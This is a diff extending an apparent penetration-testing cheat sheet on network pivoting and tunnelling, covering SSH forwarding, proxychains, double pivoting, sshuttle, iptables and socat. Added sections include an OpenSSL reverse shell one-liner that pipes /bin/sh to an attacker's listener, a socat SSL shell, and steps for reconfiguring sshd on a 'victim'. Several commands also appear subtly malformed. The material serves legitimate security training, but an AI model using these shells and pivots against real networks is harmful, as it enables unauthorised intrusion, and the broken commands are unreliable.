@@ -2,31 +2,72 @@
 
 ## Summary
 
-* [SOCKS Compatibility Table](#socks-compatibility-table)
-* [Windows netsh Port Forwarding](#windows-netsh-port-forwarding)
-* [SSH](#ssh)
-  * [SOCKS Proxy](#socks-proxy)
-  * [Local Port Forwarding](#local-port-forwarding)
-  * [Remote Port Forwarding](#remote-port-forwarding)
-* [Proxychains](#proxychains)
-* [Graftcp](#graftcp)
-* [Web SOCKS - reGeorg](#web-socks---regeorg)
-* [Web SOCKS - pivotnacci](#web-socks---pivotnacci)
-* [Metasploit](#metasploit)
-* [sshuttle](#sshuttle)
-* [chisel](#chisel)
-  * [SharpChisel](#sharpchisel)
-* [gost](#gost)
-* [Rpivot](#rpivot)
-* [RevSocks](#revsocks)
-* [plink](#plink)
-* [ngrok](#ngrok)
-* [Capture a network trace with builtin tools](#capture-a-network-trace-with-builtin-tools)
-* [Basic Pivoting Types](#basic-pivoting-types)
-  * [Listen - Listen](#listen---listen)
-  * [Listen - Connect](#listen---connect)
-  * [Connect - Connect](#connect---connect)
-* [References](#references)
+- [Network Pivoting Techniques](#network-pivoting-techniques)
+  - [Summary](#summary)
+  - [SOCKS Compatibility Table](#socks-compatibility-table)
+  - [Important Notes](#important-notes)
+    - [Avoid Using ICMP for SOCKS Proxies](#avoid-using-icmp-for-socks-proxies)
+    - [NMAP Usage with SOCKS Proxy](#nmap-usage-with-socks-proxy)
+    - [Running Scripts \& Binaries with Proxychains](#running-scripts--binaries-with-proxychains)
+    - [Quiet Mode in Proxychains](#quiet-mode-in-proxychains)
+  - [Windows netsh Port Forwarding](#windows-netsh-port-forwarding)
+  - [SSH](#ssh)
+    - [SOCKS Proxy](#socks-proxy)
+    - [Local Port Forwarding](#local-port-forwarding)
+    - [Remote Port Forwarding](#remote-port-forwarding)
+    - [SSH Dynamic Port Forwarding](#ssh-dynamic-port-forwarding)
+    - [SSH Remote Port Forwarding](#ssh-remote-port-forwarding)
+      - [Steps to Set Up SSH Remote Port Forwarding](#steps-to-set-up-ssh-remote-port-forwarding)
+    - [SSH Local Port Forwarding](#ssh-local-port-forwarding)
+      - [Usage](#usage)
+  - [Proxychains](#proxychains)
+  - [Graftcp](#graftcp)
+  - [Web SOCKS - reGeorg](#web-socks---regeorg)
+  - [Web SOCKS - pivotnacci](#web-socks---pivotnacci)
+  - [Metasploit](#metasploit)
+  - [Empire](#empire)
+  - [sshuttle](#sshuttle)
+  - [chisel](#chisel)
+    - [SharpChisel](#sharpchisel)
+  - [Ligolo](#ligolo)
+  - [Ligolo-ng](#ligolo-ng)
+      - [Single Pivot](#single-pivot)
+      - [Double Pivot](#double-pivot)
+      - [Triple, etc. Pivot](#triple-etc-pivot)
+      - [Pivoting to individual hosts to expose internally running services.](#pivoting-to-individual-hosts-to-expose-internally-running-services)
+  - [Gost](#gost)
+  - [Rpivot](#rpivot)
+  - [revsocks](#revsocks)
+  - [plink](#plink)
+  - [ngrok](#ngrok)
+  - [cloudflared](#cloudflared)
+  - [Capture a network trace with builtin tools](#capture-a-network-trace-with-builtin-tools)
+  - [Double Pivoting](#double-pivoting)
+    - [Concept](#concept)
+    - [Steps for Double Pivoting](#steps-for-double-pivoting)
+  - [SSHuttle](#sshuttle-1)
+    - [Key Features:](#key-features)
+    - [Usage Example](#usage-example)
+    - [Using SSH Key for Authentication](#using-ssh-key-for-authentication)
+    - [Route dns queries through proxy](#route-dns-queries-through-proxy)
+  - [OpenSSL](#openssl)
+    - [Generate a new RSA key \& create certificates](#generate-a-new-rsa-key--create-certificates)
+    - [Start a listener on local host](#start-a-listener-on-local-host)
+    - [Connect from target to listening port](#connect-from-target-to-listening-port)
+  - [iptables](#iptables)
+    - [Enable port forwarding in the kernel](#enable-port-forwarding-in-the-kernel)
+    - [Create a rule to redirect matching traffic on the same host](#create-a-rule-to-redirect-matching-traffic-on-the-same-host)
+    - [Create a rule to redirect matching traffic to a different host](#create-a-rule-to-redirect-matching-traffic-to-a-different-host)
+  - [socat](#socat)
+    - [Redirect all Port A connections locally to Port B](#redirect-all-port-a-connections-locally-to-port-b)
+    - [Port to remote ip and port](#port-to-remote-ip-and-port)
+    - [Translate between IPv4 and IPv6](#translate-between-ipv4-and-ipv6)
+    - [Socat SSL tunnel](#socat-ssl-tunnel)
+  - [Basic Pivoting Types](#basic-pivoting-types)
+    - [Listen - Listen](#listen---listen)
+    - [Listen - Connect](#listen---connect)
+    - [Connect - Connect](#connect---connect)
+  - [References](#references)
 
 
 ## SOCKS Compatibility Table
@@ -37,7 +78,52 @@
 | SOCKS v4a     | ✅    | ❌    | ✅    | ❌    | ✅       | ❌        |
 | SOCKS v5      | ✅    | ✅    | ✅    | ✅    | ✅       | ✅        |
 
-Remark: FQDN call requires UDP
+**Remark**: FQDN call requires UDP but can be fixed by change of local hosts file to match the FQDN with the specific host
+
+## Important Notes
+
+### Avoid Using ICMP for SOCKS Proxies
+- **Do not use ICMP echo requests (ping) to test SOCKS proxies.**
+  
+  SOCKS is a protocol that forwards network packets between a client and server through a proxy. It primarily handles TCP connections to any IP and forwards UDP packets as well.
+  
+  To test a SOCKS proxy, use a **TCP-based protocol**, such as:
+  - **SSH** (Secure Shell)
+  - **HTTP GET requests** through a tunnel
+  
+  **Reminder**: ICMP (ping) is not suitable for testing SOCKS proxies.
+
+---
+
+### NMAP Usage with SOCKS Proxy
+- **Use NMAP with TCP connect scan (`-sT`) and disable ping (`-Pn`)**.
+
+  This configuration also applies to:
+  - **Version scanning** (`-sV`)
+  - **Script scanning** (`-sC`)
+  
+  Ensure all these scans are used alongside `-sT` and `-Pn`.
+
+  **Examples:**
+  ```bash
+  proxychains nmap -sT -Pn -p- x.x.x.x
+  proxychains nmap -sT -Pn -sV -sC -p 21,80,443,445 x.x.x.x
+  ```
+
+### Running Scripts & Binaries with Proxychains
+When using proxychains with interpreted programs (e.g., Python scripts), it's best to explicitly reference the interpreter.
+
+Example:
+```bash
+proxychains4 [-q -f proxychains.conf] python python_script.py
+```
+
+Even if the script includes a hashbang (#!), specifying the interpreter can prevent network connection failures that occur when the script's traffic isn't routed through the proxy properly. Source
+
+### Quiet Mode in Proxychains
+Uncomment the "quiet mode" line in `/etc/proxychains.conf` to suppress stdout messages that may clutter your terminal.
+
+This is optional, but it can make the output cleaner and easier to manage.
 
 
 ## Windows netsh Port Forwarding
@@ -88,6 +174,98 @@ ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
 ```
 
 ### Remote Port Forwarding
+
+### SSH Dynamic Port Forwarding
+Allows you to create a socket on the local (ssh client) machine, which acts as a SOCKS proxy server. When a client connects to this port, the connection is forwarded to the remote (ssh server) machine, which is then forwarded to a dynamic port on the destination machine.
+
+**How to set it up**:  
+1. Edit /etc/proxychains.conf and implement the following:
+   - Remove **Dynamic chain** from comment.
+   - Comment **Strict chain** and **Random chain**.
+   - Append line **socks4 127.0.0.1 9050** at the end of the document (proxy list), save and close file. *You can, of course, use a different port.
+
+2. Setup the SSH Dynamic Port Forwarding:  
+  ```
+  ssh -D 127.0.0.1:9050 user@victim-IP
+  ```
+
+**Usage examples**:  
+With x.x.x.x being the ip address of a host that belongs to the tunneled network:  
+  ```
+  proxychains nmap -sT -Pn -p- x.x.x.x
+  proxychains smbmap -H x.x.x.x
+  proxychains ssh user@x.x.x.x
+  ```
+In order to use a browser through the tunnel:  
+
+  ```
+  proxychains chrome
+  proxychains firefox
+  ```  
+
+### SSH Remote Port Forwarding
+
+If you're looking for a way to establish a **reverse shell through a pivot tunnel**, SSH remote port forwarding is what you need. This method allows you to forward a port on the remote (victim) machine to a port on the local (attacker) machine.
+
+#### Steps to Set Up SSH Remote Port Forwarding
+
+1. **SSH into the Victim Machine**
+   - Access the victim machine via SSH.
+
+2. **Modify SSH Configuration**
+   - Open the `/etc/ssh/sshd_config` file and make the following changes:
+     - Uncomment and change `GatewayPorts no` to `GatewayPorts yes`.
+     - This step is crucial. If not done, the tunnel will only bind to `127.0.0.1` (localhost) instead of `0.0.0.0`, preventing traffic forwarding from external hosts.
+
+3. **Restart SSH Service**
+   - Apply the changes by restarting the SSH service:
+     ```bash
+     sudo service ssh restart
+     ```
+   - Exit the session and return to your local machine.
+
+4. **Set Up Remote Port Forwarding**
+   - After setting up, run the following command to forward a remote port:
+     ```bash
+     ssh -R 2222:*:2222 user@victim-IP
+     ```
+
+5. **Test the Setup**
+   - Set a listener on your attacker machine (e.g., using `netcat`):
+     ```bash
+     nc -lvp 2222
+     ```
+   - On the victim machine, connect to the forwarded port:
+     ```bash
+     nc 127.0.0.1 2222
+     ```
+   - If your attacker machine receives the connection, the forwarding works, and all traffic to `victim-IP:2222` will be forwarded to your attacker machine.
+
+6. **Forward Multiple Ports**
+   - You can forward multiple ports by adding additional `-R` options:
+     ```bash
+     ssh -R 2222:*:2222 -R 3333:*:3333 user@victim-IP
+     ```
+
+**Note**: Traffic from external hosts (pivoting network) must target the victim IP to be forwarded back to the attacker machine.
+
+**Alternative Method**: You can also implement remote port forwarding by SSH'ing from the victim to the attacker machine.
+
+
+### SSH Local Port Forwarding
+
+Local port forwarding allows you to forward a port on the local (attacker) machine to a port on the remote (victim) machine. This is particularly useful for scanning local ports on the victim.
+
+#### Usage
+```bash
+ssh user@victim-IP -L 8888:127.0.0.1:8086
+```
+
+This forwards local port 8888 to port 8086 on the victim machine. Now, you can scan the forwarded port on the victim machine using a tool like nmap:
+
+```bash
+nmap -Pn -n -p8888 -sV 127.0.0.1
+```
 
 ```bash
 ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
@@ -518,7 +696,144 @@ tar xvzf cloudflared-stable-linux-amd64.tgz
   tcpdump -i eth0 port 22
   ```
 
-  
+## Double Pivoting
+A great resource related to Double Pivoting can be found [here](https://pentest.blog/explore-hidden-networks-with-double-pivoting/). Double pivoting involves using SSH Dynamic Port Forwarding and Proxychains to reach multiple intermediate hosts.
+
+### Concept
+Assume we have the following machines:
+
+| IP        |	Role     |
+| --------- | -------- |
+|10.10.10.10|	Attacker |
+|10.10.10.11|	Jumphost1|
+|172.16.1.12|	Jumphost2|
+|172.16.2.13|	Jumphost3|
+
+
+* The Attacker can reach Jumphost1.
+* Jumphost1 can reach Jumphost2.
+* Jumphost2 can reach Jumphost3.
+
+### Steps for Double Pivoting
+1. Implement Dynamic Port Forwarding for Jumphost1
+   * Set up SSH Dynamic Port Forwarding to reach Jumphost2 from Jumphost1.
+2. Edit Proxychains Configuration
+   * Open the /etc/proxychains.conf file and add another SOCKS proxy entry at the end of the file:
+    ```bash
+    ...
+    socks4 127.0.0.1 9050
+    socks4 127.0.0.1 9999
+    ```
+3. Dynamic Port Forwarding for Jumphost2
+   * SSH into Jumphost1 and set up another Dynamic Port Forwarding for Jumphost2:
+    ```bash
+    ssh -D 127.0.0.1:9999 user@Jumphost2
+    ```
+    At this point, you should be able to reach Jumphost3 using proxychains, leveraging the double pivoting technique.
+
+## SSHuttle
+
+**SSHuttle** allows you to create a VPN-like connection from your machine to any remote server via SSH. It works as long as the remote server has Python 2.3 or higher. This tool enables you to forward all network traffic from your local machine through the remote server, effectively creating a VPN over SSH.
+
+### Key Features:
+- **Root access** is required on the local (client) machine.
+- On the remote (server) machine, only a **regular user account** is required (root is not necessary).
+- You can run **multiple instances of SSHuttle** simultaneously on a single client machine, connecting to different servers, allowing you to be on multiple VPNs at once.
+- For more information, check the [SSHuttle GitHub repository](https://github.com/sshuttle/sshuttle).
+
+### Usage Example
+Assuming you want to pivot into the network `172.16.2.0/16`:
+
+```bash
+# Connect to remote host
+sshuttle -vvr root@victim 172.16.2.0/16
+```
+
+### Using SSH Key for Authentication
+If you'd like to use an SSH key for authentication instead of a password:
+
+```bash
+sshuttle -vvr root@victim --ssh-cmd 'ssh -i ~/.ssh/id_rsa' 172.16.2.0/16
+```
+
+This command specifies the SSH key to use (~/.ssh/id_rsa) when connecting to the remote server.
+
+### Route dns queries through proxy
+
+```bash 
+sshuttle -dns -vv -r root@victim 0/0
+```
+
+## OpenSSL
+Very wide spread and great for Living of The Land. This command-line application usually is used to perform cryptographic tasks, such as creating and handling certificates and related files. With some creativity OpenSSL can also used in a different way
+
+### Generate a new RSA key & create certificates
+```bash
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+```
+
+### Start a listener on local host
+```bash
+openssl s_server -quiet -key.pem -cert cert.pem -port [LPORT]
+```
+
+### Connect from target to listening port
+```bash
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect [LHOST]:[LPORT] > /tmp/s; rm /tmp/s
+```
+
+## iptables 
+Another option with Living of the Land character is iptables. This is giving a lot of options to do powerful pivoting while on the other hand ultimately can lock you out if done a mistake. So better be careful on this ones :) 
+
+### Enable port forwarding in the kernel
+```bash
+echo 1 | sudo tee /proc/sys/ipv4/ip_forward
+```
+
+### Create a rule to redirect matching traffic on the same host
+```bash
+iptables -t nat -A PREROUTING -i [interface] -p tcp -dport [port_a] -j REDIRECT --to-port [port_b]
+```
+
+### Create a rule to redirect matching traffic to a different host
+```bash
+iptables -t nat -A PREROUTING -p tcp -s 192.168.1.2 --sport 1234:4321 -d 192.168.100.2 --dport 22
+```
+## socat
+Socat if installed on the target machine is another great way for tunneling while living of the land. 
+
+### Redirect all Port A connections locally to Port B
+```bash
+socat TCP4-LISTEN: [port_b], reuseaddr, fork TCP4-LISTEN:[port_a],reuseaddr
+```
+
+### Port to remote ip and port
+```bash
+socat TCP-LISTEN:[lport],fork TCP:[redirect ip]:[rport] &
+```
+
+### Translate between IPv4 and IPv6
+```bash
+socat TCP-LISTEN:[lport],fork TCP6:[redirect ipv6]:[rport] &
+```
+
+### Socat SSL tunnel
+```bash
+// Generate 
+filename=server
+openssl genrsa -out $filename.key 1024
+openssl req -new -key $filename.key -x509 -days 3653 -out $filename.crt
+cat $filename.key $filename.crt > $filename.pem
+chmod 600 $filename.key $filename.pem
+
+// run on target
+socat OPENSSL-LISTEN:443, reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
+
+// on local
+
+socat STDIO OPENSSL-CONNECT:localhost:443,cert=$filename.pem,cafile=$filename.crt
+```
+
 ## Basic Pivoting Types
 
 | Type              | Use Case                                    |
@@ -564,3 +879,4 @@ tar xvzf cloudflared-stable-linux-amd64.tgz
 * [Red Team: Using SharpChisel to exfil internal network - Shantanu Khandelwal - Jun 8](https://medium.com/@shantanukhande/red-team-using-sharpchisel-to-exfil-internal-network-e1b07ed9b49)
 * [Active Directory - hideandsec](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory)
 * [Windows: Capture a network trace with builtin tools (netsh) - February 22, 2021 Michael Albert](https://michlstechblog.info/blog/windows-capture-a-network-trace-with-builtin-tools-netsh/)
+* [Benji's Pivoting & Tunneling guide](https://benjitrapp.github.io/attacks/2024-09-28-pivoting/)
